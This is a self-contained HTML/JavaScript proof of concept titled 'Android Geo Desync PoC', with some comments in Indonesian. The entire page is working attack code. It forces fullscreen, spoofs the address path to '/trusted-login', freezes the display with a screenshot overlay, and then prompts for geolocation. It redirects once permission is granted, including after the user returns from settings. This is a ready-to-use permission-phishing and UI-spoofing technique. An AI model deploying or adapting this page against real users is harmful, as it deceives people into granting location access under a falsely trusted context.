<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Android Geo Desync PoC</title>

<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>

<style>
body {
  margin:0;
  font-family:system-ui;
  background:#f5f5f7;
  text-align:center;
}
button {
  margin-top:100px;
  font-size:16px;
  padding:14px 18px;
  border-radius:12px;
  border:none;
  background:#007aff;
  color:#fff;
}
</style>
</head>

<body>

<button id="start">Start Demo</button>

<script>
const TARGET = "https://google.com";

// logging optional
function log(type){
  console.log(type);
}

// freeze UI
function freezeUI() {
  return html2canvas(document.body,{scale:2}).then(canvas=>{
    const img = document.createElement("img");
    img.src = canvas.toDataURL();
    Object.assign(img.style,{
      position:"fixed",
      top:"0",
      left:"0",
      width:"100vw",
      height:"100vh",
      zIndex:"999999"
    });
    document.body.innerHTML="";
    document.body.appendChild(img);
  });
}

// request location
function requestGeo() {
  navigator.geolocation.getCurrentPosition(
    () => {
      log("granted");
      location.replace(TARGET);
    },
    () => {
      log("denied");
    }
  );
}

// 🔥 detect user kembali dari settings
document.addEventListener("visibilitychange", () => {
  if (document.visibilityState === "visible") {
    log("back_from_settings");

    // cek permission lagi
    navigator.permissions?.query({name:'geolocation'}).then(res=>{
      if(res.state === "granted"){
        location.replace(TARGET);
      }
    });
  }
});

// start
document.getElementById("start").onclick = () => {

  // fullscreen
  if (document.documentElement.requestFullscreen) {
    document.documentElement.requestFullscreen();
  }

  // spoof path
  history.replaceState({}, '', '/trusted-login');

  // freeze UI dulu
  freezeUI().then(()=>{

    // delay dikit biar overlay ready
    setTimeout(()=>{
      requestGeo();
    },100);

  });
};

</script>

</body>
</html>
